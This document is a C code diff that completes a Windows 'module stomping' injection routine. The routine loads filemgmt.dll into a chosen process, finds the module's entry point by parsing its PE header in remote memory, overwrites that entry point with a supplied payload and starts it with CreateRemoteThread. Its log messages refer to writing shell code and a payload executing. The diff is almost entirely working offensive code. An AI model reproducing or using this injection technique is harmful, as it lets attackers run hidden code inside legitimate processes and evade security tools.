@@ -1,6 +1,62 @@
-#include <windows.h>
-#include <stdio.h>
+#ifndef UNICODE //helps mitigate error on line 31. Ref# https://stackoverflow.com/questions/13977388/error-cannot-convert-const-wchar-t-13-to-lpcstr-aka-const-char-in-assi
+#define UNICODE
+#define UNICODE_WAS_UNDEFINED
+#endif
 
+#include <windows.h>
+
+#ifdef UNICODE_WAS_UNDEFINED
+#undef UNICODE
+#endif
+
+#include <stdio.h>
+#include <string.h>
+#include <Psapi.h>
+
+// helper functions
+
+// Find loaded module address
+HMODULE FindModuleBase(HANDLE hProcess) {
+    HMODULE hModuleList[1024];
+    wchar_t moduleName[MAX_PATH];
+    DWORD cb = sizeof(hModuleList);
+    DWORD cbNeeded = 0;
+
+    // Enum all module in the process
+
+    if(EnumProcessModulesEx(hProcess, hModuleList, sizeof(hModuleList), &cbNeeded, LIST_MODULES_64BIT)) {
+        int lastErr = GetLastError();
+        for(unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
+            // get full path of the module
+            if (GetModuleFileNameEx(hProcess, hModuleList[i], moduleName, (sizeof(moduleName) / sizeof(DWORD)))) {
+                if(wcsstr(moduleName, L"filemgmt.dll") != nullptr) {
+                    return hModuleList[i];
+                }
+            }
+        }
+    }
+
+    return 0;
+}
+
+LPVOID FindEntryPoint(HANDLE hProcess, HMODULE hModule) {
+    LPVOID targetDllHeader = { 0 };
+    DWORD sizeOfHeader = 0x1000;
+    
+    // allocate local heap
+    targetDllHeader = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeOfHeader);
+    // read header of target dlls
+    ReadProcessMemory(hProcess, (LPVOID)hModule, targetDllHeader, sizeOfHeader, NULL);
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetDllHeader;
+    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetDllHeader + dosHeader->e_lfanew);
+    // getting entry point of target dll
+    DWORD_PTR dllEntryPoint = ntHeader->OptionalHeader.AddressOfEntryPoint;
+    wprintf(L"[+]dll entry point offset: %p\n", (LPVOID)dllEntryPoint);
+    // entry point in memory: base address + entry point offset
+    LPVOID dllEntryPointInMem = (LPVOID)(dllEntryPoint + (DWORD_PTR)hModule);
+    wprintf(L"[+]dll entry point in memory: %p\n", dllEntryPointInMem);
+    return dllEntryPointInMem;
+}
 
 BOOL ModuleStomping(unsigned char payload[], SIZE_T payload_size, int pid) {
     HANDLE hProcess = INVALID_HANDLE_VALUE;
@@ -48,14 +104,29 @@ BOOL ModuleStomping(unsigned char payload[], SIZE_T payload_size, int pid) {
     // LoadLibraryA will allow us to load the targetLibrary (or module/dll) inside the target process.
     hTargetModule = CreateRemoteThread(hProcess, NULL, 0, loadModule, memBase, 0, NULL);
     if (hTargetModule == INVALID_HANDLE_VALUE) {
-        printf("[-] Faled to load module inside the target process. Error: %d\n", GetLastError());
+        printf("[-] Failed to load module inside the target process. Error: %d\n", GetLastError());
         return FALSE;
     }
 
-    printf("[+] Successfully loaded our module inside the target process");
+    printf("[+] Successfully loaded our module inside the target process\n");
     WaitForSingleObject(hTargetModule, 2000);
 
-    
+    moduleBase = FindModuleBase(hProcess);
+    if (moduleBase == 0) {
+        printf("[-] Could not search the target module inside the injected process\n");
+        return FALSE;
+    }
+
+    entryPoint = FindEntryPoint(hProcess, moduleBase);
+
+    // writing to the process memory
+    if(!WriteProcessMemory(hProcess, entryPoint, payload, payload_size, NULL)) {
+        printf("[-] Could not write shell code in the entry point of the loaded dll. Error: %d\n", GetLastError());
+        return FALSE;
+    }
+
+    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, 0);
+    printf("[+] Payload executed\n");
 
     return TRUE;
 }
